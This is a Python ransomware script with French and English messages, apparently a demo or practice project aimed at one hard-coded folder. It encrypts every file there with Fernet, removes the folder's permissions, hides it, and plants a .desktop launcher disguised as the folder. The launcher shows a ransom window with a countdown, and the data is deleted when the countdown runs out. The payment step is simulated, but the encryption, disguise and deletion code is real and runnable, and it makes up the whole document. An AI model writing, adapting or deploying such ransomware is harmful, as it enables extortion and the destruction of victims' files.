import os
import shutil
import time
from threading import Thread
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

TARGET_DIRECTORY = "/home/maverick/Desktop/pack"  
COUNTDOWN_DURATION = 120    

# Key for encryption/decryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)
KEY_FILE = "ransom_key.key"

with open(KEY_FILE, "wb") as key_file:
    key_file.write(key)

payment_made = False
is_encrypted = False

def encrypt_files(directory):
    global is_encrypted
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")
    is_encrypted = True
    
    try:
        os.chmod(directory, 0o000)  
        print(f"Acces a {directory} refusee.")
    except Exception as e:
        print(f"Erreur sur l'enlevement du droit sur {directory}: {e}")

def decrypt_files(directory):
    
    global is_encrypted
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decryptage reussi: {file_path}")
            except Exception as e:
                print(f"Erreur de decryptage de {file_path}: {e}")
    is_encrypted = False
    
    try:
        os.chmod(directory, 0o755)  
        print(f"Acces a {directory} restaurer.")
    except Exception as e:
        print(f"Erreur sur la restauration des droits sur : {directory}: {e}")

def delete_directory(directory):
    try:
        shutil.rmtree(directory)
        print(f"Le repertoire {directory} et ses composants ont ete efface avec success .")
    except Exception as e:
        print(f"Erreur de suppression de {directory}: {e}")

def countdown_timer(window, time_label, time_left):
    global payment_made
    for remaining in range(time_left, -1, -1):
        if payment_made:
            return 
        mins, secs = divmod(remaining, 60)
        timeformat = f"Time Left: {mins:02d}:{secs:02d}"
        time_label.config(text=timeformat)
        window.update()
        time.sleep(1)
    if not payment_made:
        time_label.config(text="Temps ecoule!! Donnees supprimee.")
        window.update()
        
        try:
            delete_directory(f".{HIDDEN_DIR}_hidden")
            print(f"Dossier caché supprimé : {HIDDEN_DIR}")
        except Exception as e:
            print(f"Erreur lors de la suppression du dossier caché : {e}")
            
        try:
            os.remove(DESKTOP_FILE)
            print(f"Lanceur supprimé : {DESKTOP_FILE}")
        except Exception as e:
            print(f"Erreur lors de la suppression du lanceur : {e}")
            
        for w in tk._default_root.winfo_children():
            try:
                w.destroy()
            except Exception:
                pass
            
        try:
            tk._default_root.destroy()
        except Exception:
            pass

def simulate_transaction(window, time_label):
    global payment_made
    transaction_window = tk.Toplevel(window)
    transaction_window.title("Ransom Payment")
    transaction_window.geometry("400x200")

    window.update_idletasks()
    x = window.winfo_x()
    y = window.winfo_y()
    w = window.winfo_width()
    h = window.winfo_height()
    
    transaction_window.geometry(f"+{x + w + 10}+{y}")

    label = tk.Label(transaction_window, text="Entrez les details du payment pour $1,000,000,000")
    label.pack(pady=10)

    entry = tk.Entry(transaction_window)
    entry.pack(pady=10)

    def complete_payment():
        global payment_made
        try:
            amount = int(entry.get())
            if amount >= 1_000_000_000:
                payment_made = True
                messagebox.showinfo("Payment Successful", "Transaction completed. Files will be decrypted.")
                transaction_window.destroy()
                decrypt_files(HIDDEN_DIR)
                
                try:
                    os.remove(DESKTOP_FILE)
                    print(f"Lanceur supprimé : {DESKTOP_FILE}")
                except Exception as e:
                    print(f"Erreur lors de la suppression du lanceur : {e}")
                    
                try:
                    os.rename(HIDDEN_DIR, TARGET_DIRECTORY)
                    print(f"Dossier restauré : {TARGET_DIRECTORY}")
                except Exception as e:
                    print(f"Erreur lors de la restauration du dossier : {e}")
                window.destroy()
            else:
                messagebox.showerror("Error", "Payment must be at least $1,000,000,000.")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid numeric amount.")

    pay_button = tk.Button(transaction_window, text="Payer Maintenant", command=complete_payment)
    pay_button.pack(pady=10)

def show_ransom_dialog():
    root = tk.Tk()
    root.title("RANSOM DEMAND")
    root.geometry("600x300")

    warning_label = tk.Label(
        root,
        text="You have been Hacked!\n"
             "All your files have been encrypted!\n"
             "Pay $1,000,000,000 to decrypt your data.\n"
             "If time runs out, all data will be deleted forever!",
        font=("Arial", 12, "bold"),
        fg="red"
    )
    warning_label.pack(pady=20)

    time_label = tk.Label(root, text="", font=("Arial", 14))
    time_label.pack(pady=10)

    timer_thread = Thread(target=countdown_timer, args=(root, time_label, COUNTDOWN_DURATION))
    timer_thread.start()

    simulate_transaction(root, time_label)
    root.mainloop()

def check_access_and_trigger_dialog(directory):
    global is_encrypted
    if is_encrypted:
        print(f"Accessed direct attempt detected for encryptory: {directory}")
        show_ransom_dialog()
    else:
        print(f"Directory {directory} is not encrypted. Access granted.")

# Main execution
if __name__ == "__main__":
    import sys
    
    BASE_DIR = os.path.dirname(TARGET_DIRECTORY)
    FOLDER_NAME = os.path.basename(TARGET_DIRECTORY)
    HIDDEN_DIR = os.path.join(BASE_DIR, f".{FOLDER_NAME}_hidden")
    DESKTOP_FILE = os.path.join(BASE_DIR, FOLDER_NAME + ".desktop")

    def create_desktop_launcher():
        python_exec = sys.executable
        script_path = os.path.abspath(__file__)
        desktop_content = f"""[Desktop Entry]
Type=Application
Name={FOLDER_NAME}
Exec={python_exec} "{script_path}" --ransom
Icon=folder
Terminal=false
"""
        with open(DESKTOP_FILE, "w") as f:
            f.write(desktop_content)
        os.chmod(DESKTOP_FILE, 0o755)
        print(f"Lanceur .desktop créé : {DESKTOP_FILE}")

    if "--ransom" in sys.argv:
        if os.path.exists(HIDDEN_DIR):
            is_encrypted = True  
            check_access_and_trigger_dialog(HIDDEN_DIR)
        else:
            print(f"Le dossier caché {HIDDEN_DIR} n'existe pas.")
    elif os.path.exists(TARGET_DIRECTORY):
        print(f"Targeting directory: {TARGET_DIRECTORY}")
        
        os.rename(TARGET_DIRECTORY, HIDDEN_DIR)
        print(f"Dossier caché sous : {HIDDEN_DIR}")

        create_desktop_launcher()

        encrypt_files(HIDDEN_DIR)
    else:
        print(f"Directory {TARGET_DIRECTORY} does not exist. Please update the path.")